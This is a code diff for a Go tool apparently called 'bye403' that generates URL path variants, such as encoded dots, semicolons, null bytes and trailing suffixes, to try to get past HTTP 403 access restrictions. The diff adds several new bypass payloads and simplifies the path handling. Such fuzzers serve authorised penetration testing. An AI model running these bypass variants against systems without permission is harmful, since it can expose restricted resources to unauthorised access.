@@ -2,9 +2,7 @@ package main
 
 import (
 	"fmt"
-	"log"
 	"math/rand"
-	"net/url"
 	"strings"
 	"time"
 )
@@ -16,6 +14,7 @@ func init() {
 func (b *bye403) front(u string) []string {
 	f := []string{
 		"/%2e", "/%2f", "/;", "/.;", "//;/", "/.",
+		";foo=bar",
 	}
 	var urls []string
 	for _, s := range f {
@@ -28,7 +27,8 @@ func (b *bye403) back(u string) []string {
 	trail := []string{
 		"/", "..;/", "/..;/", "%20", "%09", "%00", 
 		".json", ".css", ".html", "?", "??", "???", 
-		"?testparam", "#", "#test", "/.",
+		"?testparam", "#", "#test", "/.", "//", ";/",
+		"/~",
 	}
 	var urls []string
 	for _, t := range trail {
@@ -62,15 +62,11 @@ func (b *bye403) spongeb(u string) string {
 }
 
 func (b *bye403) paths(target string) []string {
-	u, err := url.ParseRequestURI(target)
-	if err != nil {
-		log.Fatal(err)
-	}
 	var paths []string
-	paths = append(paths, b.bookends(u.Path)...)
-	paths = append(paths, b.front(u.Path)...)
-	paths = append(paths, b.back(u.Path)...)
-	paths = append(paths, b.spongeb(u.Path))
+	paths = append(paths, b.bookends(b.path)...)
+	paths = append(paths, b.front(b.path)...)
+	paths = append(paths, b.back(b.path)...)
+	paths = append(paths, b.spongeb(b.path))
 	
 	return paths
 }
